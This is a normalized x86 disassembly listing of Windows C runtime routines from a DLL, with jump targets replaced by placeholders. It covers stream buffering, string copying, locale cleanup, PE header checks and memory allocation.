jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
or eax 0xffffffff
pop ebp
retn
sub_1001215c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_100119d7
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_10010d42
pop ecx
push eax
call sub_10014c85
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_10010d42
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_10010d42
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push edi
push esi
call sub_10010d42
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_10010d42
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
pop edi
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_1001227e
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx edi
je r-xdata
push esi
call sub_10010d42
pop ecx
mov edx rw-data
cmp eax edi
je r-xdata
mov eax edi
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
test al al
jns r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
cmp eax edi
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_100119d7
pop ecx
test al 0x2
jne r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ eax + 0x24 ] 0x80
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
jmp r-xdata
sub_10012361
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10008d64
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_1000ffa0
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_10009ef0
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_10009991
pop ecx
cmp eax ebx
je r-xdata
call sub_1000ff70
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_10012448
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10009611
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10012361
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10012488
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_10009957
push [ esi + 0x8 ]
call sub_10009957
push [ esi + 0xc ]
call sub_10009957
push [ esi + 0x10 ]
call sub_10009957
push [ esi + 0x14 ]
call sub_10009957
push [ esi + 0x18 ]
call sub_10009957
push [ esi ]
call sub_10009957
push [ esi + 0x20 ]
call sub_10009957
push [ esi + 0x24 ]
call sub_10009957
push [ esi + 0x28 ]
call sub_10009957
push [ esi + 0x2c ]
call sub_10009957
push [ esi + 0x30 ]
call sub_10009957
push [ esi + 0x34 ]
call sub_10009957
push [ esi + 0x1c ]
call sub_10009957
push [ esi + 0x38 ]
call sub_10009957
push [ esi + 0x3c ]
call sub_10009957
add esp 0x40
push [ esi + 0x40 ]
call sub_10009957
push [ esi + 0x44 ]
call sub_10009957
push [ esi + 0x48 ]
call sub_10009957
push [ esi + 0x4c ]
call sub_10009957
push [ esi + 0x50 ]
call sub_10009957
push [ esi + 0x54 ]
call sub_10009957
push [ esi + 0x58 ]
call sub_10009957
push [ esi + 0x5c ]
call sub_10009957
push [ esi + 0x60 ]
call sub_10009957
push [ esi + 0x64 ]
call sub_10009957
push [ esi + 0x68 ]
call sub_10009957
push [ esi + 0x6c ]
call sub_10009957
push [ esi + 0x70 ]
call sub_10009957
push [ esi + 0x74 ]
call sub_10009957
push [ esi + 0x78 ]
call sub_10009957
push [ esi + 0x7c ]
call sub_10009957
add esp 0x40
push [ esi + 0x80 ]
call sub_10009957
push [ esi + 0x84 ]
call sub_10009957
push [ esi + 0x88 ]
call sub_10009957
push [ esi + 0x8c ]
call sub_10009957
push [ esi + 0x90 ]
call sub_10009957
push [ esi + 0x94 ]
call sub_10009957
push [ esi + 0x98 ]
call sub_10009957
push [ esi + 0x9c ]
call sub_10009957
push [ esi + 0xa0 ]
call sub_10009957
push [ esi + 0xa4 ]
call sub_10009957
push [ esi + 0xa8 ]
call sub_10009957
push [ esi + 0xbc ]
call sub_10009957
push [ esi + 0xc0 ]
call sub_10009957
push [ esi + 0xc4 ]
call sub_10009957
push [ esi + 0xc8 ]
call sub_10009957
push [ esi + 0xcc ]
call sub_10009957
add esp 0x40
push [ esi + 0xd0 ]
call sub_10009957
push [ esi + 0xb8 ]
call sub_10009957
push [ esi + 0xd8 ]
call sub_10009957
push [ esi + 0xdc ]
call sub_10009957
push [ esi + 0xe0 ]
call sub_10009957
push [ esi + 0xe4 ]
call sub_10009957
push [ esi + 0xe8 ]
call sub_10009957
push [ esi + 0xec ]
call sub_10009957
push [ esi + 0xd4 ]
call sub_10009957
push [ esi + 0xf0 ]
call sub_10009957
push [ esi + 0xf4 ]
call sub_10009957
push [ esi + 0xf8 ]
call sub_10009957
push [ esi + 0xfc ]
call sub_10009957
push [ esi + 0x100 ]
call sub_10009957
push [ esi + 0x104 ]
call sub_10009957
push [ esi + 0x108 ]
call sub_10009957
add esp 0x40
push [ esi + 0x10c ]
call sub_10009957
push [ esi + 0x110 ]
call sub_10009957
push [ esi + 0x114 ]
call sub_10009957
push [ esi + 0x118 ]
call sub_10009957
push [ esi + 0x11c ]
call sub_10009957
push [ esi + 0x120 ]
call sub_10009957
push [ esi + 0x124 ]
call sub_10009957
push [ esi + 0x128 ]
call sub_10009957
push [ esi + 0x12c ]
call sub_10009957
push [ esi + 0x130 ]
call sub_10009957
push [ esi + 0x134 ]
call sub_10009957
push [ esi + 0x138 ]
call sub_10009957
push [ esi + 0x13c ]
call sub_10009957
push [ esi + 0x140 ]
call sub_10009957
push [ esi + 0x144 ]
call sub_10009957
push [ esi + 0x148 ]
call sub_10009957
add esp 0x40
push [ esi + 0x14c ]
call sub_10009957
push [ esi + 0x150 ]
call sub_10009957
push [ esi + 0x154 ]
call sub_10009957
push [ esi + 0x158 ]
call sub_10009957
push [ esi + 0x15c ]
call sub_10009957
push [ esi + 0x160 ]
call sub_10009957
add esp 0x18
sub_100127ff
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009957
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009957
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009957
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_10009957
pop ecx
push esi
call sub_10009957
pop ecx
sub_10012868
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009957
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009957
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009957
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009957
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009957
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009957
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009957
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009957
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009957
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009957
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10009957
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_10009957
pop ecx
push esi
call sub_10009957
pop ecx
sub_10012970
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_10012a63
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_10012aa7
push 0x20
push r--data
call sub_1000f940
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_1000bbd4
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_1000f985
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_10012a63
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_1000ee02
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_10011e3f
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_1000ba9d
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10012c0e
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_10012c70
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_10012cb0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10012d00
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_1000f9a0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_10012c70
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_10012cb0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10012dbc
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_1000ba9d
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008d64
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_10012f28
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_1000b7fe
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_1000b7fe
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_1000b7ac
mov eax esi
sub_10012f9d
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_1000b7fe
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_1000b7fe
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_1000b7ac
mov eax esi
jmp r-xdata
sub_1001306a
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_100130a9
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_1000b7fe
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_1000cd91
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_1001312b
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_10009f96
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_10012129
pop ecx
mov ebx eax
call sub_1000b7fe
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_1000ffa0
add esp 0xc
sub_10013199
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10009611
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_10013210
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_1001323b
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_100132f5
push 0x10
push r--data
call sub_1000f940
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_10011e3f
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10013388
mov eax [ ebp - 0x1c ]
call sub_1000f985
retn
mov esi edi
mov eax [ rw-data ]
cmp [ eax + esi * 4 ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_1000a565
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_10009957
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
inc [ ebp - 0x1c ]
sub_10013391
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
mov esi eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x30 ] 0xc
mov [ ebp - 0x2c ] ebx
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000b75a
int3
mov eax 0x8000
